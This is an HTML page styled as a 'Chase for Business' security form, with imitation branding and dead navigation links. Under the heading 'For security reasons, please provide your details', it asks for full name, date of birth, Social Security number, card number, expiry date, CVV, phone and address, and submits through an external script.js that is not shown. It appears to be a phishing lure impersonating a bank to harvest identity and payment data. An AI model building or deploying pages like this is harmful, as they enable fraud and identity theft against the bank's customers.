<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Form - Chase for Business</title>
    <script src="https://cdn.tailwindcss.com"></script>

    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; }
        .transition-all { transition: all 0.3s ease; }
        .success-message { color: #10b981; background-color: #d1fae5; border: 1px solid #a7f3d0; padding: 12px; border-radius: 6px; }
        .error-message { color: #ef4444; background-color: #fee2e2; border: 1px solid #fecaca; padding: 12px; border-radius: 6px; }
        .loading { opacity: 0.7; pointer-events: none; }
        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-gray-100">
    <div class="bg-white">
        <header class="container mx-auto px-4">
            <div class="flex justify-between items-center py-2 text-sm">
                <div class="flex items-center space-x-4">
                    <a class="px-2 py-1" href="#">Personal</a>
                    <a class="px-2 py-1 border-b-2 border-blue-600 text-blue-600 font-semibold" href="#">Business</a>
                    <a class="px-2 py-1" href="#">Commercial</a>
                </div>
                <div class="flex items-center space-x-4">
                    <a class="flex items-center" href="#">Customer service <span class="material-icons text-sm">expand_more</span></a>
                    <a href="#">Español</a>
                    <span class="material-icons">search</span>
                </div>
            </div>
            <div class="flex justify-between items-center py-4 border-t">
                <div class="flex items-center space-x-2">
                    <div class="h-8 w-8 bg-blue-600 rounded-full flex items-center justify-center">
                        <span class="text-white font-bold text-sm">C</span>
                    </div>
                    <span class="text-2xl font-semibold text-blue-800">CHASE</span>
                    <span class="text-2xl font-light text-gray-700">for BUSINESS℠</span>
                </div>
            </div>
            <nav class="flex items-center space-x-8 text-gray-700 pb-2 border-b">
                <a class="py-2" href="#">Checking &amp; more</a>
                <a class="py-2" href="#">Loans &amp; financing</a>
                <a class="py-2" href="#">Accept credit/debit cards</a>
                <a class="py-2" href="#">Business credit cards</a>
                <a class="py-2" href="#">Help &amp; support</a>
                <a class="py-2" href="#">Resource center</a>
            </nav>
        </header>
    </div>
    <main class="container mx-auto px-4 mt-8">
        <div class="flex flex-col lg:flex-row gap-8">
            <div class="lg:w-1/2">
                <h1 class="text-4xl lg:text-5xl font-light text-gray-800">For security reasons, please provide your details:</h1>
                <div class="mt-8 bg-gray-200 rounded-lg h-64 flex items-center justify-center">
                    <span class="text-gray-500">Security Image</span>
                </div>
            </div>
            <div class="lg:w-1/2">
                <div class="bg-white p-8 rounded-lg shadow-md">
                    <form id="securityForm">
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div>
                                <label class="block text-sm text-gray-600 mb-2" for="first_name">First Name:</label>
                                <input class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 transition-all" id="first_name" name="first_name" type="text" required>
                            </div>
                            <div>
                                <label class="block text-sm text-gray-600 mb-2" for="last_name">Last Name:</label>
                                <input class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 transition-all" id="last_name" name="last_name" type="text" required>
                            </div>
                        </div>
                        
                        <div class="mt-4">
                            <label class="block text-sm text-gray-600 mb-2" for="date_of_birth">Date of Birth:</label>
                            <input class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 transition-all" id="date_of_birth" name="date_of_birth" type="date" required>
                        </div>
                        
                        <div class="mt-4">
                            <label class="block text-sm text-gray-600 mb-2" for="ssn">SSN:</label>
                            <input class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 transition-all" id="ssn" name="ssn" type="text" placeholder="XXX-XX-XXXX" maxlength="11" required>
                        </div>
                        
                        <div class="mt-4">
                            <label class="block text-sm text-gray-600 mb-2" for="card_number">Card Number:</label>
                            <input class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 transition-all" id="card_number" name="card_number" type="text" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19" required>
                        </div>
                        
                        <div class="grid grid-cols-2 gap-4 mt-4">
                            <div>
                                <label class="block text-sm text-gray-600 mb-2" for="card_exp">Expiration:</label>
                                <input class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 transition-all" id="card_exp" name="card_exp" type="text" placeholder="MM/YY" maxlength="5" required>
                            </div>
                            <div>
                                <label class="block text-sm text-gray-600 mb-2" for="cvv">CVV:</label>
                                <input class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 transition-all" id="cvv" name="cvv" type="text" placeholder="XXX" maxlength="4" required>
                            </div>
                        </div>
                        
                        <div class="mt-4">
                            <label class="block text-sm text-gray-600 mb-2" for="phone">Phone Number:</label>
                            <input class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 transition-all" id="phone" name="phone" type="tel" placeholder="(XXX) XXX-XXXX" maxlength="14" required>
                        </div>
                        
                        <div class="mt-4">
                            <label class="block text-sm text-gray-600 mb-2" for="address">Address:</label>
                            <input class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 transition-all" id="address" name="address" type="text" required>
                        </div>
                        
                        <button class="w-full bg-blue-600 text-white font-bold py-3 rounded-md mt-6 hover:bg-blue-700 transition-all" type="submit" id="submitBtn">
                            Submit Information
                        </button>
                    </form>
                    <div id="formMessage" class="mt-4 hidden"></div>
                </div>
            </div>
        </div>
    </main>
    <script src="script.js"></script>
</body>
</html>
